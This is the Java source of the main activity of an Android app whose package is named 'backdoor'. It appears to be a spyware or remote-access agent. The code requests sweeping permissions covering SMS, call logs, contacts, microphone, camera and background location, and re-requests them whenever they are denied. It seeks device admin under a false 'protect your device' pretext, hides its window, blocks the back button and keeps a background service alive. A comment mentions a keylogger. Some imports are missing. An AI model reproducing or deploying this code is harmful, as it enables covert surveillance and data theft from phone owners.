package com.lazyframework.backdoor;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "LazyFramework";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private static final int NOTIFICATION_PERMISSION_REQUEST = 102;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isFinishing = false;
    private boolean allPermissionsGranted = false;
    
    // ============ DAFTAR PERMISSIONS YANG DIBUTUHKAN ============
    private static final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.INTERNET,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.WRITE_CONTACTS,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.WRITE_CALL_LOG,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.GET_ACCOUNTS,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.SYSTEM_ALERT_WINDOW,
        android.Manifest.permission.WAKE_LOCK
    };

    // ============ PERMISSIONS UNTUK ANDROID 13+ ============
    private static final String[] PERMISSIONS_ANDROID_13 = {
        android.Manifest.permission.POST_NOTIFICATIONS,
        android.Manifest.permission.READ_MEDIA_IMAGES,
        android.Manifest.permission.READ_MEDIA_VIDEO,
        android.Manifest.permission.READ_MEDIA_AUDIO
    };

    // ============ PERMISSIONS UNTUK ANDROID 14+ ============
    private static final String[] PERMISSIONS_ANDROID_14 = {
        android.Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
        android.Manifest.permission.FOREGROUND_SERVICE_CAMERA,
        android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
        android.Manifest.permission.FOREGROUND_SERVICE_LOCATION,
        android.Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "🚀 MainActivity created - Auto starting in background");
        
        // ============ 1. MULAI PROSES AUTO START ============
        startAutoStartProcess();
    }

    private void activateDeviceAdmin() {
    try {
        ComponentName cn = DeviceAdminReceiver.getComponentName(this);
        DevicePolicyManager dpm = (DevicePolicyManager) 
            getSystemService(Context.DEVICE_POLICY_SERVICE);
        
        if (!dpm.isAdminActive(cn)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "This app needs device admin to protect your device");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    } catch (Exception e) {
        Log.e(TAG, "Activate admin error: " + e.getMessage());
    }
    }

    // ==================== AUTO START PROCESS ====================
    
    private void startAutoStartProcess() {
        Log.d(TAG, "🔄 Auto start process initiated");
        
        // Step 1: Request all permissions
        checkAndRequestPermissions();
        
        // Step 2: Request overlay permission (Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestOverlayPermission();
        }
        
        // Step 3: Request notification access (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestNotificationPermission();
        }
        
        // Step 4: Start service
        startAgentService();
        
        // Step 5: Hide activity after 500ms
        handler.postDelayed(() -> {
            hideActivity();
        }, 500);
        
        // Step 6: Keep checking permissions in background
        startPermissionMonitor();
    }

    // ==================== PERMISSION HANDLING ====================

    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // Basic permissions
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        // Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : PERMISSIONS_ANDROID_13) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        }
        
        // Android 14+ permissions (foreground service types)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            for (String permission : PERMISSIONS_ANDROID_14) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            Log.d(TAG, "📋 Requesting " + permissionsNeeded.size() + " permissions");
            ActivityCompat.requestPermissions(
                this,
                permissionsNeeded.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            Log.d(TAG, "✅ All permissions already granted");
            allPermissionsGranted = true;
        }
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.d(TAG, "🔄 Requesting overlay permission");
                Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
            } else {
                Log.d(TAG, "✅ Overlay permission already granted");
            }
        }
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, 
                    android.Manifest.permission.POST_NOTIFICATIONS) 
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "🔄 Requesting notification permission");
                ActivityCompat.requestPermissions(
                    this,
                    new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                    NOTIFICATION_PERMISSION_REQUEST
                );
            }
        }
    }

    // ==================== PERMISSION RESULT ====================

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            int granted = 0;
            int denied = 0;
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                    Log.d(TAG, "✅ Permission granted: " + permissions[i]);
                } else {
                    denied++;
                    Log.d(TAG, "❌ Permission denied: " + permissions[i]);
                }
            }
            
            allPermissionsGranted = (denied == 0);
            
            Log.d(TAG, "📊 Permission results: " + granted + " granted, " + denied + " denied");
            
            // If some permissions denied, request again
            if (denied > 0) {
                handler.postDelayed(() -> {
                    Log.d(TAG, "🔄 Re-requesting denied permissions");
                    checkAndRequestPermissions();
                }, 2000);
            } else {
                Log.d(TAG, "✅ All permissions granted!");
                startAgentService();
            }
        }
        
        if (requestCode == NOTIFICATION_PERMISSION_REQUEST) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "✅ Notification permission granted");
            } else {
                Log.d(TAG, "⚠️ Notification permission denied - notifications may not show");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    Log.d(TAG, "✅ Overlay permission granted");
                } else {
                    Log.d(TAG, "⚠️ Overlay permission denied - requesting again");
                    handler.postDelayed(() -> {
                        requestOverlayPermission();
                    }, 2000);
                }
            }
        }
    }

    // ==================== START SERVICE ====================

    private void startAgentService() {
        try {
            Log.d(TAG, "🚀 Starting AgentService...");
            
            Intent serviceIntent = new Intent(this, AgentService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
                Log.d(TAG, "✅ Foreground service started (Android 8+)");
            } else {
                startService(serviceIntent);
                Log.d(TAG, "✅ Service started");
            }
            
            // Also start keylogger service if needed
            // KeyloggerHelper is started via Accessibility
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting service: " + e.getMessage());
            
            // Retry after delay
            handler.postDelayed(() -> {
                Log.d(TAG, "🔄 Retrying to start service...");
                startAgentService();
            }, 3000);
        }
    }

    // ==================== PERMISSION MONITOR ====================

    private void startPermissionMonitor() {
        // Monitor permissions in background
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isFinishing) {
                    checkPermissionsStatus();
                    // Continue monitoring every 10 seconds
                    handler.postDelayed(this, 10000);
                }
            }
        }, 5000);
    }

    private void checkPermissionsStatus() {
        boolean allGranted = true;
        List<String> missingPermissions = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                missingPermissions.add(permission);
            }
        }
        
        if (!allGranted) {
            Log.d(TAG, "⚠️ Missing permissions: " + missingPermissions.size());
            // Request missing permissions again
            if (!isFinishing) {
                checkAndRequestPermissions();
            }
        }
    }

    // ==================== HIDE ACTIVITY ====================

    private void hideActivity() {
        try {
            Log.d(TAG, "👻 Hiding activity...");
            
            // Move to background
            moveTaskToBack(true);
            
            // Finish activity
            if (!isFinishing) {
                finish();
                isFinishing = true;
            }
            
            Log.d(TAG, "✅ Activity hidden");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error hiding activity: " + e.getMessage());
        }
    }

    // ==================== OVERRIDE METHODS ====================

    @Override
    public void onBackPressed() {
        // Disable back button - do nothing
        // This prevents user from accidentally closing
        Log.d(TAG, "🔒 Back button disabled");
    }

    @Override
    protected void onPause() {
        super.onPause();
        // If activity is paused, make sure service is still running
        if (!isFinishing) {
            startAgentService();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        // If activity is stopped, ensure service continues
        if (!isFinishing) {
            startAgentService();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isFinishing = true;
        Log.d(TAG, "💀 MainActivity destroyed - Service continues running");
    }

    @Override
    protected void onResume() {
        super.onResume();
        // If activity comes back to foreground, hide it again
        if (!isFinishing) {
            handler.postDelayed(() -> {
                hideActivity();
            }, 100);
        }
    }

    // ==================== SHOW PERMISSION DIALOG (Optional) ====================

    private void showPermissionDialog() {
        try {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("🔒 Permissions Required");
            builder.setMessage(
                "LazyAgent needs the following permissions to work properly:\n\n" +
                "• 📍 Location - For GPS tracking\n" +
                "• 📁 Storage - For files and media\n" +
                "• 👤 Contacts - For reading contacts\n" +
                "• 💬 SMS - For reading messages\n" +
                "• 📞 Call Log - For call history\n" +
                "• 🎤 Microphone - For audio recording\n" +
                "• 📷 Camera - For taking photos\n" +
                "• 🔑 Accounts - For account info\n\n" +
                "Please grant all permissions when prompted."
            );
            builder.setPositiveButton("Grant Permissions", (dialog, which) -> {
                checkAndRequestPermissions();
            });
            builder.setCancelable(false);
            builder.show();
        } catch (Exception e) {
            Log.e(TAG, "Dialog error: " + e.getMessage());
        }
    }

    // ==================== SILENT MODE TOGGLE ====================

    // Jika ingin mode benar-benar silent tanpa aktivitas sama sekali
    // Gunakan theme @android:style/Theme.NoDisplay di AndroidManifest

    // ==================== RESTART SERVICE ====================

    public void restartService() {
        Log.d(TAG, "🔄 Restarting service...");
        try {
            stopService(new Intent(this, AgentService.class));
            Thread.sleep(500);
            startAgentService();
        } catch (Exception e) {
            Log.e(TAG, "Restart error: " + e.getMessage());
        }
    }

    // ==================== CHECK IF SERVICE IS RUNNING ====================

    private boolean isServiceRunning() {
        android.app.ActivityManager manager = 
            (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (android.app.ActivityManager.RunningServiceInfo service : 
                manager.getRunningServices(Integer.MAX_VALUE)) {
            if (AgentService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
